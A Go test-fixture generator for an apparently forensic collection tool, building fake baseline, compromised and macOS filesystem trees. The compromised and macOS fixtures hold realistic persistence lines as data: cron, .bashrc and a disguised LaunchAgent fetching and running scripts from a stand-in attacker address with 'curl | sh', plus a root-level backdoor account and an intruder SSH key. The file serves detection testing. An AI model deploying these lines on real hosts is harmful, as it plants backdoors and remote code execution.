// Package fixtures generates the synthetic host filesystem trees used by
// tests and the demo (testdata/hosts/*). Everything here is invented: the
// "binaries" are inert shell-script stand-ins, IP addresses come from the
// RFC 5737 documentation ranges, and SSH keys are random-looking bytes that
// are not real keys. The trees are committed; TestFixturesUpToDate keeps
// them in sync with this generator.
package fixtures

import (
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"net/netip"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"time"

	"github.com/archit2501/evidencelocker/pkg/collectors/users"
)

// Hosts lists the fixture names Build understands.
var Hosts = []string{"baseline", "compromised", "macos"}

type node struct {
	data   string
	mode   os.FileMode
	link   string // symlink target when non-empty
	binary []byte
}

type tree map[string]node

func (t tree) file(p, data string)      { t[p] = node{data: data, mode: 0o644} }
func (t tree) exec(p, data string)      { t[p] = node{data: data, mode: 0o755} }
func (t tree) symlink(p, target string) { t[p] = node{link: target} }
func (t tree) bin(p string, b []byte)   { t[p] = node{binary: b, mode: 0o644} }
func (t tree) stub(p, what string)      { t.exec(p, stubScript(what)) }
func stubScript(what string) string {
	return "#!/bin/sh\n# evidencelocker fixture stand-in for " + what + "; inert.\nexit 0\n"
}
func fakeKey(seed string) string {
	// An SSH wire-format blob: string "ssh-ed25519" + string(32 bytes).
	sum := sha256.Sum256([]byte(seed))
	blob := append([]byte{0, 0, 0, 11}, "ssh-ed25519"...)
	blob = append(blob, 0, 0, 0, 32)
	blob = append(blob, sum[:]...)
	return base64.StdEncoding.EncodeToString(blob)
}

var loginTime = time.Date(2026, 9, 14, 8, 30, 0, 0, time.UTC)

// Build writes fixture host name into dir (which must not exist).
func Build(dir, name string) error {
	var t tree
	switch name {
	case "baseline":
		t = linuxBaseline()
	case "compromised":
		t = linuxCompromised()
	case "macos":
		t = macos()
	default:
		return fmt.Errorf("unknown fixture %q", name)
	}
	if err := os.Mkdir(dir, 0o755); err != nil {
		return err
	}
	paths := make([]string, 0, len(t))
	for p := range t {
		paths = append(paths, p)
	}
	sort.Strings(paths)
	for _, p := range paths {
		n := t[p]
		full := filepath.Join(dir, filepath.FromSlash(p))
		if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
			return err
		}
		var err error
		switch {
		case n.link != "":
			err = os.Symlink(n.link, full)
		case n.binary != nil:
			err = os.WriteFile(full, n.binary, n.mode)
		default:
			err = os.WriteFile(full, []byte(n.data), n.mode)
		}
		if err != nil {
			return err
		}
		if n.link == "" {
			if err := os.Chmod(full, n.mode); err != nil {
				return err
			}
		}
	}
	return nil
}

type proc struct {
	pid, ppid, uid int
	name, exe      string
	args           []string
	cwd            string
	state          string
	sockets        []int
}

func (t tree) proc(p proc) {
	base := fmt.Sprintf("proc/%d/", p.pid)
	if p.state == "" {
		p.state = "S (sleeping)"
	}
	t.file(base+"status", fmt.Sprintf("Name:\t%s\nUmask:\t0022\nState:\t%s\nTgid:\t%d\nPid:\t%d\nPPid:\t%d\nUid:\t%d\t%d\t%d\t%d\nGid:\t%d\t%d\t%d\t%d\n",
		p.name, p.state, p.pid, p.pid, p.ppid, p.uid, p.uid, p.uid, p.uid, p.uid, p.uid, p.uid, p.uid))
	t.file(base+"comm", p.name+"\n")
	t.file(base+"cmdline", strings.Join(p.args, "\x00")+"\x00")
	t.file(base+"stat", fmt.Sprintf("%d (%s) S %d %d %d 0 -1 4194560 100 0 0 0 1 2 0 0 20 0 1 0 %d 1000000 200 18446744073709551615 0 0 0 0 0 0 0 0 0 0 0 0 17 0 0 0 0 0 0\n",
		p.pid, p.name, p.ppid, p.pid, p.pid, 1000+p.pid))
	if p.exe != "" {
		t.symlink(base+"exe", p.exe)
	}
	t.symlink(base+"cwd", p.cwd)
	t.symlink(base+"fd/0", "/dev/null")
	for i, ino := range p.sockets {
		t.symlink(fmt.Sprintf("%sfd/%d", base, i+3), fmt.Sprintf("socket:[%d]", ino))
	}
}

const tcpHeader = "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n"

func sockLine(i int, local, remote, st string, uid, inode int) string {
	return fmt.Sprintf("%4d: %s %s %s 00000000:00000000 00:00000000 00000000 %5d        0 %d 1 0000000000000000 100 0 0 10 0\n",
		i, local, remote, st, uid, inode)
}

func linuxBaseline() tree {
	t := tree{}
	t.file("etc/hostname", "web01\n")
	t.file("etc/os-release", "PRETTY_NAME=\"Ubuntu 24.04.1 LTS (evidencelocker fixture)\"\nNAME=\"Ubuntu\"\nVERSION_ID=\"24.04\"\nID=ubuntu\n")
	t.file("etc/passwd", strings.Join([]string{
		"root:x:0:0:root:/root:/bin/bash",
		"daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
		"bin:x:2:2:bin:/bin:/usr/sbin/nologin",
		"www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
		"backup:x:34:34:backup:/var/backups:/usr/sbin/nologin",
		"systemd-resolve:x:991:991:systemd Resolver:/:/usr/sbin/nologin",
		"sshd:x:105:65534::/run/sshd:/usr/sbin/nologin",
		"alice:x:1000:1000:Alice Admin,,,:/home/alice:/bin/bash",
	}, "\n")+"\n")
	t.file("etc/group", "root:x:0:\nadm:x:4:syslog,alice\nsudo:x:27:alice\nwww-data:x:33:\nbackup:x:34:\nalice:x:1000:\n")
	t.file("etc/crontab", "# /etc/crontab: system-wide crontab\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n"+
		"17 *\t* * *\troot\tcd / && run-parts --report /etc/cron.hourly\n"+
		"25 6\t* * *\troot\ttest -x /usr/sbin/anacron || run-parts --report /etc/cron.daily\n")
	t.file("etc/cron.d/e2scrub_all", "30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron\n")
	t.exec("etc/cron.daily/logrotate", "#!/bin/sh\n/usr/sbin/logrotate /etc/logrotate.conf\n")
	t.file("usr/lib/systemd/system/nginx.service", "[Unit]\nDescription=A high performance web server\nAfter=network.target\n\n[Service]\nType=forking\nExecStartPre=/usr/sbin/nginx -t -q\nExecStart=/usr/sbin/nginx -g 'daemon on; master_process on;'\nExecReload=/usr/sbin/nginx -s reload\n\n[Install]\nWantedBy=multi-user.target\n")
	t.file("usr/lib/systemd/system/ssh.service", "[Unit]\nDescription=OpenBSD Secure Shell server\n\n[Service]\nExecStart=/usr/sbin/sshd -D $SSHD_OPTS\nExecReload=/bin/kill -HUP $MAINPID\n\n[Install]\nWantedBy=multi-user.target\n")
	t.file("usr/lib/systemd/system/cron.service", "[Unit]\nDescription=Regular background program processing daemon\n\n[Service]\nExecStart=/usr/sbin/cron -f\n\n[Install]\nWantedBy=multi-user.target\n")
	t.symlink("lib", "usr/lib")
	t.symlink("etc/systemd/system/multi-user.target.wants/nginx.service", "/usr/lib/systemd/system/nginx.service")
	t.symlink("etc/systemd/system/multi-user.target.wants/ssh.service", "/usr/lib/systemd/system/ssh.service")
	t.symlink("etc/systemd/system/multi-user.target.wants/cron.service", "/usr/lib/systemd/system/cron.service")
	t.file("etc/profile", "# /etc/profile\nif [ -d /etc/profile.d ]; then\n  for i in /etc/profile.d/*.sh; do . $i; done\nfi\n")
	t.file("etc/profile.d/locale.sh", "export LANG=C.UTF-8\n")
	t.file("etc/bash.bashrc", "# system-wide .bashrc\n[ -z \"$PS1\" ] && return\nshopt -s checkwinsize\n")
	t.file("root/.bashrc", "# ~/.bashrc for root\nexport HISTCONTROL=ignoredups\nalias ll='ls -l'\n")
	t.file("home/alice/.bashrc", "# ~/.bashrc\nHISTSIZE=1000\nalias gs='git status'\n")
	t.file("home/alice/.profile", "# ~/.profile\n[ -f \"$HOME/.bashrc\" ] && . \"$HOME/.bashrc\"\n")
	t.file("home/alice/.ssh/authorized_keys", "ssh-ed25519 "+fakeKey("alice-laptop")+" alice@laptop\n")
	for _, b := range []string{"ls", "bash", "sh", "curl", "python3", "cat", "ps", "ss"} {
		t.stub("usr/bin/"+b, b)
	}
	for _, b := range []string{"sshd", "nginx", "cron", "logrotate"} {
		t.stub("usr/sbin/"+b, b)
	}
	t.stub("usr/lib/systemd/systemd", "systemd")
	t.stub("usr/lib/systemd/systemd-resolved", "systemd-resolved")
	t.symlink("bin", "usr/bin")
	t.symlink("sbin", "usr/sbin")
	t.file("tmp/.keep", "")
	t.file("var/tmp/.keep", "")
	t.bin("var/run/utmp", users.EncodeUtmp([]users.Utmp{
		{Type: users.TypeBootTime, Line: "~", User: "reboot", Time: loginTime.Add(-72 * time.Hour)},
		{Type: users.TypeLoginProcess, PID: 880, Line: "tty1", ID: "tty1", User: "LOGIN", Time: loginTime.Add(-72 * time.Hour)},
		{Type: users.TypeUserProcess, PID: 1190, Line: "pts/0", ID: "ts/0", User: "alice", Host: "10.0.0.5", Time: loginTime, Addr: netip.MustParseAddr("10.0.0.5")},
	}))
	baseProcs(t)
	t.file("proc/net/tcp", tcpHeader+
		sockLine(0, "00000000:0016", "00000000:0000", "0A", 0, 1001)+
		sockLine(1, "00000000:0050", "00000000:0000", "0A", 0, 1002)+
		sockLine(2, "0200000A:0016", "0500000A:C738", "01", 0, 1009))
	t.file("proc/net/tcp6", tcpHeader+
		sockLine(0, "00000000000000000000000000000000:0016", "00000000000000000000000000000000:0000", "0A", 0, 1003))
	t.file("proc/net/udp", tcpHeader+
		sockLine(0, "3500007F:0035", "00000000:0000", "07", 991, 1004))
	t.file("proc/net/udp6", tcpHeader)
	return t
}

func baseProcs(t tree) {
	t.proc(proc{pid: 1, ppid: 0, name: "systemd", exe: "/usr/lib/systemd/systemd", args: []string{"/sbin/init", "splash"}, cwd: "/"})
	t.proc(proc{pid: 2, ppid: 0, name: "kthreadd", cwd: "/"})
	t.proc(proc{pid: 500, ppid: 1, uid: 991, name: "systemd-resolve", exe: "/usr/lib/systemd/systemd-resolved", args: []string{"/usr/lib/systemd/systemd-resolved"}, cwd: "/", sockets: []int{1004}})
	t.proc(proc{pid: 612, ppid: 1, name: "sshd", exe: "/usr/sbin/sshd", args: []string{"sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"}, cwd: "/", sockets: []int{1001, 1003}})
	t.proc(proc{pid: 700, ppid: 1, name: "nginx", exe: "/usr/sbin/nginx", args: []string{"nginx: master process /usr/sbin/nginx -g daemon on; master_process on;"}, cwd: "/", sockets: []int{1002}})
	t.proc(proc{pid: 701, ppid: 700, uid: 33, name: "nginx", exe: "/usr/sbin/nginx", args: []string{"nginx: worker process"}, cwd: "/", sockets: []int{1002}})
	t.proc(proc{pid: 900, ppid: 1, name: "cron", exe: "/usr/sbin/cron", args: []string{"/usr/sbin/cron", "-f", "-P"}, cwd: "/var/spool/cron"})
	t.proc(proc{pid: 1190, ppid: 612, uid: 1000, name: "sshd", exe: "/usr/sbin/sshd", args: []string{"sshd: alice@pts/0"}, cwd: "/", sockets: []int{1009}})
	t.proc(proc{pid: 1200, ppid: 1190, uid: 1000, name: "bash", exe: "/usr/bin/bash", args: []string{"-bash"}, cwd: "/home/alice"})
}

// The documentation-range address 203.0.113.50 (RFC 5737 TEST-NET-3) stands
// in for attacker infrastructure; it is not routable.
func linuxCompromised() tree {
	t := linuxBaseline()
	pw := t["etc/passwd"]
	pw.data += "sysupd:x:0:0::/var/lib/sysupd:/bin/bash\n"
	t["etc/passwd"] = pw
	t.file("etc/group", "root:x:0:\nadm:x:4:syslog,alice\nsudo:x:27:alice,backup\nwww-data:x:33:\nbackup:x:34:\nalice:x:1000:\n")
	t.file("etc/cron.d/sysupdate", "# keeps the system up to date\n*/5 * * * * root curl -fsSL http://203.0.113.50/u.sh | sh\n")
	t.file("var/spool/cron/crontabs/www-data", "@reboot /tmp/.cache/kworkerd --listen 4444\n")
	t.file("etc/systemd/system/dbus-org.freedesktop.helper.service", "[Unit]\nDescription=D-Bus Helper\n\n[Service]\nExecStart=/tmp/.cache/kworkerd --listen 4444\nRestart=always\n\n[Install]\nWantedBy=multi-user.target\n")
	t.symlink("etc/systemd/system/multi-user.target.wants/dbus-org.freedesktop.helper.service", "/etc/systemd/system/dbus-org.freedesktop.helper.service")
	t.file("root/.bashrc", "# ~/.bashrc for root\nexport HISTCONTROL=ignoredups\nalias ll='ls -l'\nexport PROMPT_COMMAND='history -a; curl -s http://203.0.113.50/k >/dev/null 2>&1'\n")
	t.file("home/alice/.ssh/authorized_keys", "ssh-ed25519 "+fakeKey("alice-laptop")+" alice@laptop\n"+
		"command=\"/tmp/.cache/kworkerd\",no-pty ssh-ed25519 "+fakeKey("intruder")+" deploy@build\n")
	t.file("etc/ld.so.preload", "/usr/local/lib/libsysaudit.so\n")
	t.exec("usr/bin/ls", stubScript("ls")+"# trojanised copy (fixture)\n")
	t.stub("usr/local/bin/sysupdate", "sysupdate")
	t.stub("tmp/.cache/kworkerd", "kworkerd")
	t.file("tmp/.cache/notes.txt", "staging area (fixture)\n")
	t.proc(proc{pid: 4242, ppid: 1, uid: 33, name: "kworkerd", exe: "/tmp/.cache/kworkerd", args: []string{"/tmp/.cache/kworkerd", "--listen", "4444"}, cwd: "/tmp/.cache", sockets: []int{2001}})
	t.proc(proc{pid: 4300, ppid: 4242, uid: 33, name: "stage2", exe: "/tmp/.cache/stage2 (deleted)", args: []string{"stage2"}, cwd: "/tmp/.cache"})
	t.file("proc/net/tcp", tcpHeader+
		sockLine(0, "00000000:0016", "00000000:0000", "0A", 0, 1001)+
		sockLine(1, "00000000:0050", "00000000:0000", "0A", 0, 1002)+
		sockLine(2, "00000000:115C", "00000000:0000", "0A", 33, 2001)+
		sockLine(3, "0200000A:0016", "0500000A:C738", "01", 0, 1009))
	t.bin("var/run/utmp", users.EncodeUtmp([]users.Utmp{
		{Type: users.TypeBootTime, Line: "~", User: "reboot", Time: loginTime.Add(-72 * time.Hour)},
		{Type: users.TypeLoginProcess, PID: 880, Line: "tty1", ID: "tty1", User: "LOGIN", Time: loginTime.Add(-72 * time.Hour)},
		{Type: users.TypeUserProcess, PID: 1190, Line: "pts/0", ID: "ts/0", User: "alice", Host: "10.0.0.5", Time: loginTime, Addr: netip.MustParseAddr("10.0.0.5")},
		{Type: users.TypeUserProcess, PID: 4100, Line: "pts/1", ID: "ts/1", User: "sysupd", Host: "203.0.113.50", Time: loginTime.Add(26 * time.Hour), Addr: netip.MustParseAddr("203.0.113.50")},
	}))
	return t
}

func macos() tree {
	t := tree{}
	t.file("System/Library/CoreServices/SystemVersion.plist", plistDoc(`<dict><key>ProductName</key><string>macOS</string><key>ProductVersion</key><string>15.6</string></dict>`))
	t.file("Library/LaunchDaemons/com.example.backupd.plist", plistDoc(`<dict>
	<key>Label</key><string>com.example.backupd</string>
	<key>ProgramArguments</key><array><string>/usr/local/libexec/backupd</string><string>--daily</string></array>
	<key>StartCalendarInterval</key><dict><key>Hour</key><integer>2</integer></dict>
</dict>`))
	t.file("Users/bob/Library/LaunchAgents/com.apple.softwareupdate.agent.plist", plistDoc(`<dict>
	<key>Label</key><string>com.apple.softwareupdate.agent</string>
	<key>ProgramArguments</key><array><string>/bin/sh</string><string>-c</string><string>curl -s http://203.0.113.50/a | sh</string></array>
	<key>RunAtLoad</key><true/>
	<key>KeepAlive</key><true/>
	<key>StartInterval</key><integer>300</integer>
</dict>`))
	t.bin("Library/LaunchAgents/com.example.binary.plist", append([]byte("bplist00"), make([]byte, 24)...))
	t.file("Users/bob/.zshrc", "export PATH=$HOME/bin:$PATH\n")
	t.file("etc/passwd", "##\n# User Database (fixture)\n##\nnobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false\nroot:*:0:0:System Administrator:/var/root:/bin/sh\n")
	return t
}

func plistDoc(body string) string {
	return `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
` + body + "\n</plist>\n"
}
